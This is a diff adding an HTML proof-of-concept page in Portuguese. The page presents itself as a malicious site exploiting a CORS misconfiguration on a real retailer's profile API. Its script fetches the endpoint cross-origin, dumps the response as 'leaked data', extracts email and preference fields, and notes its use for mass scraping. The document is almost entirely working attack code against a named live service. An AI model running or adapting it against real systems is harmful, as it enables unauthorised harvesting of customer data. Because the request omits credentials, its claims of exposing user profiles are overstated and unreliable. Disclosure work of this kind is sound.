@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS PoC - Lululemon Profile Leak</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        #output { background: #f0f0f0; padding: 10px; border: 1px solid #ccc; white-space: pre-wrap; }
+        button { padding: 10px; background: #ff4444; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>PoC: Exploração de CORS Misconfig no Lululemon API</h1>
+    <p>Este site malicioso (origem: <span id="origin"></span>) acessa dados de perfil via <a href="https://shop.lululemon.com/api/dataenablement/profile" target="_blank">https://shop.lululemon.com/api/dataenablement/profile</a>.</p>
+    <p><strong>Headers na Response:</strong> Access-Control-Allow-Origin: * (Permite leitura cross-origin!)</p>
+    <button onclick="exploitCORS()">Explorar e Dump Dados</button>
+    <div id="output">Clique no botão para ver o vazamento...</div>
+
+    <script>
+        // Detecta origem atual (arbitrária/maliciosa)
+        document.getElementById('origin').textContent = window.location.origin;
+
+        async function exploitCORS() {
+            const endpoint = 'https://shop.lululemon.com/api/dataenablement/profile';
+            const output = document.getElementById('output');
+
+            try {
+                output.textContent = 'Enviando requisição cross-origin...\n';
+                
+                const response = await fetch(endpoint, {
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Malicious Site)',
+                        // Simule auth se necessário (mas endpoint parece não-auth)
+                        // 'Authorization': 'Bearer fake-token'  // Teste se retorna dados auth
+                    },
+                    mode: 'cors',  // Força CORS mode
+                    credentials: 'omit'  // Sem creds para simular third-party
+                });
+
+                // Prova: CORS permite leitura (senão, erro "No 'Access-Control-Allow-Origin'")
+                console.log('Response Headers:', response.headers.get('access-control-allow-origin'));  // Deve logar '*'
+                console.log('Status:', response.status);
+
+                const data = await response.json();
+                
+                // Dump dados (ex: perfil JSON)
+                output.innerHTML += '\n=== DADOS VAZADOS (JSON) ===\n' + JSON.stringify(data, null, 2);
+                console.log('Dados vazados:', data);  // Para scraping em massa
+
+                // Simule impacto: Extraia email ou prefs se presente
+                if (data.email) {
+                    output.innerHTML += '\n\n🚨 EMAIL EXPOSTO: ' + data.email;
+                }
+                if (data.preferences) {
+                    output.innerHTML += '\n\n🚨 PREFERÊNCIAS: ' + JSON.stringify(data.preferences, null, 2);
+                }
+
+                output.innerHTML += '\n\nPoC Completo: Cross-origin fetch bem-sucedido devido a ACAO: *';
+                
+            } catch (error) {
+                output.textContent += '\nErro: ' + error.message + '\n(Se "No CORS", vuln fixada!)';
+                console.error('Falha na exploração:', error);
+            }
+        }
+    </script>
+</body>
+</html>
